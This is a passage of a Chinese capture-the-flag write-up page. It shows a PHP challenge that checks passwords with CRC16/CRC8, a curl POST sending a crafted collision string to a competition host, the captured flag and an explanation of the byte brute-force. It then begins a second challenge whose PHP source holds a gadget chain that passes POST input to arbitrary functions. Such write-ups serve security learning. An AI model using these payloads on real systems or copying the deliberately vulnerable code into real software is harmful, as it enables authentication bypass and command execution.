class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span>        <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span>        <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xF3</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$bytes</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C*'</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$k</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token variable">$crc8_table</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$crc</span> <span class="token operator">^</span> <span class="token variable">$bytes</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$crc</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$SECRET_PASS</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Enj0yNSSCTF4th!"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$SECRET_PASS</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$correct_pass_crc16</span> <span class="token operator">=</span> <span class="token function">compute_crc16</span><span class="token punctuation">(</span><span class="token variable">$SECRET_PASS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$correct_pass_crc8</span> <span class="token operator">=</span> <span class="token function">calculate_crc8</span><span class="token punctuation">(</span><span class="token variable">$SECRET_PASS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user_input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$user_pass_crc16</span> <span class="token operator">=</span> <span class="token function">compute_crc16</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user_pass_crc8</span> <span class="token operator">=</span> <span class="token function">calculate_crc8</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SECRET_PASS</span> <span class="token operator">===</span> <span class="token variable">$user_input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这样不行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$correct_pass_crc16</span> <span class="token operator">!==</span> <span class="token variable">$user_pass_crc16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这样也不行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$correct_pass_crc8</span> <span class="token operator">!==</span> <span class="token variable">$user_pass_crc8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这样还是不行吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$granted_access</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$granted_access</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"都到这份上了,flag就给你了: <span class="token interpolation"><span class="token variable">$FLAG</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不不不"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"再试试"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> 再试试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -s -X POST http://node10.anna.nssctf.cn:26491/ \  -H "Content-Type: application/x-www-form-urlencoded" \  --data $'pass=Enj0yNSSCTF4e\xA8-'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>好——这是个典型的“用两种弱校验（CRC16 + CRC8）判断密码，但又不允许完全相同”的 CTF 题。思路是：找到一个<strong>与 <code>Enj0yNSSCTF4th!</code> 长度相同、但不是相同字符串</strong>，同时满足 <code>compute_crc16()</code> 和 <code>calculate_crc8()</code> 的值都与原串相同。<br> 我直接算出了一个可用碰撞，并给出怎么发送它以触发后端返回 flag。</p><p>原串：<code>Enj0yNSSCTF4th!</code> （长度 15）<br> 碰撞串（字节表示）：</p><pre class="line-numbers language-none"><code class="language-none">45 6E 6A 30 79 4E 53 53 43 54 46 34 65 A8 2D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果按二进制/转义表示为（方便在 shell 中使用）：</p><pre class="line-numbers language-none"><code class="language-none">Enj0yNSSCTF4e\xA8-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL/表单的 percent-encoding（application/x-www-form-urlencoded）：</p><pre class="line-numbers language-none"><code class="language-none">%45%6E%6A%30%79%4E%53%53%43%54%46%34%65%A8%2D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我已验证该碰撞满足：</p><ul><li><code>compute_crc16(碰撞串) == compute_crc16(原串)</code></li><li><code>calculate_crc8(碰撞串) == calculate_crc8(原串)</code></li><li>且字符串 <strong>不等于</strong> 原串（后端的 <code>===</code> 检查会通过）。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST http://target/ <span class="token punctuation">\</span>  <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/x-www-form-urlencoded"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--data</span> <span class="token string">$'pass=Enj0yNSSCTF4e<span class="token entity" title="\xA8">\xA8</span>-'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>都到这份上了,flag就给你了: NSSCTF{6cec3f15-249f-4c88-925e-3bc394e26d3a}</p><blockquote><h2 id="1-题目要我们干什么？"><a href="#1-题目要我们干什么？" class="headerlink" title="1. 题目要我们干什么？"></a>1. 题目要我们干什么？</h2><p>后端要求：</p><ol><li>你提交的密码 <code>$_POST['pass']</code> <strong>长度必须和真密码一样（15字节）</strong>；</li><li>不能直接等于 <code>"Enj0yNSSCTF4th!"</code>；</li><li>但要满足两件事：<ul><li><code>compute_crc16(你的密码) == compute_crc16(真密码)</code></li><li><code>calculate_crc8(你的密码) == calculate_crc8(真密码)</code></li></ul></li></ol><p>也就是说：<strong>你要找一个“长得不一样，但 CRC16 和 CRC8 一模一样”的假密码。</strong></p><hr><h2 id="2-为什么这事有可能做到？"><a href="#2-为什么这事有可能做到？" class="headerlink" title="2. 为什么这事有可能做到？"></a>2. 为什么这事有可能做到？</h2><p>CRC 并不是加密，它是个“校验码”。它的特点：</p><ul><li>计算过程是线性的（每个字节的影响可以叠加）。</li><li>校验码长度有限（CRC16 = 16位，CRC8 = 8位）。</li></ul><p>这道题同时用 CRC16 和 CRC8，看似安全，其实两个加起来也就 24 位，你随便改几个字节，很容易出现“碰撞”。</p><hr><h2 id="3-怎么下手？"><a href="#3-怎么下手？" class="headerlink" title="3. 怎么下手？"></a>3. 怎么下手？</h2><p>我们知道原密码：<code>Enj0yNSSCTF4th!</code><br> 长度 15 字节。<br> 你不可能一个字节一个字节全乱改，那是 256^15 = 天文数字。</p><p>聪明做法：<strong>只改最后 3 个字节</strong>。<br> 原来的最后 3 个字节是：</p><pre class="line-numbers language-none"><code class="language-none">t (0x74)h (0x68)! (0x21)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把它们换成 <code>X Y Z</code> 三个未知字节，其它 12 个字节保持不变。<br> 这样我们要找的其实是 <strong>3 个字节</strong>（24 位）。</p><hr><h2 id="4-为什么-3-个字节足够？"><a href="#4-为什么-3-个字节足够？" class="headerlink" title="4. 为什么 3 个字节足够？"></a>4. 为什么 3 个字节足够？</h2><p>因为要满足的校验一共 24 位（CRC16 有 16 位，CRC8 有 8 位）。<br> 我们有 24 位可调（3 字节 = 24 位）。<br> 这和<strong>解一个 24 位方程</strong>几乎是一样的，<strong>理论上一定有解</strong>。</p><hr><h2 id="5-具体怎么解？"><a href="#5-具体怎么解？" class="headerlink" title="5. 具体怎么解？"></a>5. 具体怎么解？</h2><p>关键：<strong>先算出真密码的 CRC16 和 CRC8</strong>，它们是我们要“对齐”的目标值。</p><h3 id="第一步：计算真密码的-CRC"><a href="#第一步：计算真密码的-CRC" class="headerlink" title="第一步：计算真密码的 CRC"></a>第一步：计算真密码的 CRC</h3><pre class="line-numbers language-none"><code class="language-none">secret = b"Enj0yNSSCTF4th!"t16 = compute_crc16(secret)  # 算出来是个 16 位数t8  = calculate_crc8(secret) # 算出来是个 8 位数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="第二步：拿前-12-个字节计算-CRC-的“起点”"><a href="#第二步：拿前-12-个字节计算-CRC-的“起点”" class="headerlink" title="第二步：拿前 12 个字节计算 CRC 的“起点”"></a>第二步：拿前 12 个字节计算 CRC 的“起点”</h3><pre class="line-numbers language-none"><code class="language-none">prefix = secret[:12]c16_prefix = compute_crc16(prefix)c8_prefix  = calculate_crc8(prefix)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这就是你改动后三个字节前，CRC 算出来的状态。</p><h3 id="第三步：开始“爆破”最后三个字节"><a href="#第三步：开始“爆破”最后三个字节" class="headerlink" title="第三步：开始“爆破”最后三个字节"></a>第三步：开始“爆破”最后三个字节</h3><p>做法：<strong>枚举前两个字节 X、Y（0..255 各种可能）</strong>，用它们推 CRC8 到第 14 字节，再算出“必须要选哪个 Z 才能让 CRC8 最后等于目标值”。</p><p>这样一来，我们不用枚举 3 个字节，而是枚举 2 个字节就够了（65536 次）。</p><h3 id="第四步：检查-CRC16-是否也对"><a href="#第四步：检查-CRC16-是否也对" class="headerlink" title="第四步：检查 CRC16 是否也对"></a>第四步：检查 CRC16 是否也对</h3><p>有了 X、Y、Z 三个字节，组成新的密码：</p><pre class="line-numbers language-none"><code class="language-none">new_pass = prefix + X + Y + Z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再算一遍 CRC16，看和目标的一样不一样。如果一样，就找到碰撞了。</p></blockquote><hr><h3 id="mpga-filesystem"><a href="#mpga-filesystem" class="headerlink" title="[mpga]filesystem"></a>[mpga]filesystem</h3><p><strong>使用<code>certutil</code>命令</strong>：按<code>Win + R</code>，输入<code>cmd</code>并回车，打开命令提示符。输入<code>certutil -hashfile 文件路径 MD5</code>，例如<code>certutil -hashfile D:\file.txt MD5</code>，即可查看文件的 MD5 值。</p><pre class="line-numbers language-none"><code class="language-none">"D:\Downloads\www (8).zip"certutil -hashfile "D:\Downloads\www (8).zip" MD5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ApplicationContext</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$contextName</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">contextName</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ApplicationContext'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">contextName</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">contextName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ContentProcessor</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$processedContent</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$callbackFunction</span><span class="token punctuation">;</span>       <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">processedContent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FunctionInvoker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">property_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">callbackFunction</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$key</span><span class="token operator">-&gt;</span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">callbackFunction</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileManager</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$targetFile</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$responseData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'default_response'</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$targetFile</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span> <span class="token operator">=</span> <span class="token variable">$targetFile</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filterPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\/|php:|data|zip|\.\.\//i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'文件路径不符合规范'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">performWriteOperation</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token variable">$targetObject</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">;</span>         <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$targetObject</span><span class="token operator">-&gt;</span><span class="token variable">$var</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFileHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">filterPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$md5_hash</span> <span class="token operator">=</span> <span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string double-quoted-string">"文件MD5哈希: "</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$md5_hash</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件未找到"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                                <span class="token variable">$md5_hash</span> <span class="token operator">=</span> <span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">targetFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string double-quoted-string">"文件MD5哈希 (尝试): "</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$md5_hash</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">TypeError</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                <span class="token keyword">return</span> <span class="token string double-quoted-string">"无法计算MD5哈希，因为文件参数无效: "</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件未找到"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$method</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">responseData</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FunctionInvoker</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$functionName</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$functionArguments</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'home'</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token variable">$upload_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$upload_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$allowed_extensions</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$file_info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token 